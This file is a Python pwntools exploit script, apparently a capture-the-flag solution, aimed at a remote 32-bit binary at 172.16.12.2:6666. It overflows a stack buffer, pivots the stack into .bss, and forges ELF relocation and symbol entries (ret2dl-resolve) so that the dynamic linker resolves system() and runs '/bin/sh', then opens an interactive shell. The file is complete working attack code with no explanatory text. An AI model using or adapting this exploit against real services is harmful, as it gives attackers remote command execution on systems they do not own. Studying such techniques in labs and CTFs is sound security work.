from pwn import *
#context(os='linux',arch='amd64')
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

name = './pwn'
p = remote('172.16.12.2',6666)
#p = process(name)
elf = ELF(name)
#libc=ELF('./libc.so.6')
if args.G:
    gdb.attach(p)

rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr   
dynsym_addr =  elf.get_section_by_name('.dynsym').header.sh_addr    
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr


resolve_plt = 0x8048380
bss_addr =  0x804a040
start_addr = bss_addr + 0x500  

ppp_ret = 0x80485d9     #pop esi;pop edi;pop ebp;ret    
pop_ebp_ret = 0x80485db  
leave_ret = 0x804854a 

read_plt_addr = elf.plt['read']
read_got_addr = elf.got['read']


pay1 = b"a"*40
pay1 += b"b"*4
pay1 += p32(read_plt_addr)
pay1 += p32(ppp_ret)
pay1 += p32(0)
pay1 += p32(start_addr-4)
pay1 += p32(0x100)
pay1 += p32(pop_ebp_ret)
pay1 += p32(start_addr-4)
pay1 += p32(leave_ret)

relloc_offset = start_addr + 20 - rel_plt_addr

symAt = rel_plt_addr + relloc_offset + 0x8
align = 0x10 - ((symAt-dynsym_addr)&0xf)
symAt = symAt + align

r_sym = (symAt - dynsym_addr)//0x10
r_info = (r_sym << 8) + 0x7
fake_rel = p32(read_got_addr) + p32(r_info)

strAt = symAt + 0x10
st_name = strAt - dynstr_addr

fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

arg_str = b'/bin/sh\0'
system = b'system\0'

argAt = strAt + len(system)

pay2 = p32(start_addr-4)
pay2 += p32(resolve_plt)
pay2 += p32(relloc_offset)
pay2 += p32(read_plt_addr)
pay2 += p32(argAt)
pay2 += b"aaaa"
pay2 += fake_rel
pay2 += b'\0'*align
pay2 += fake_sym
pay2 += system
pay2 += arg_str  

p.send(pay1)
p.send(pay2)
p.interactive()
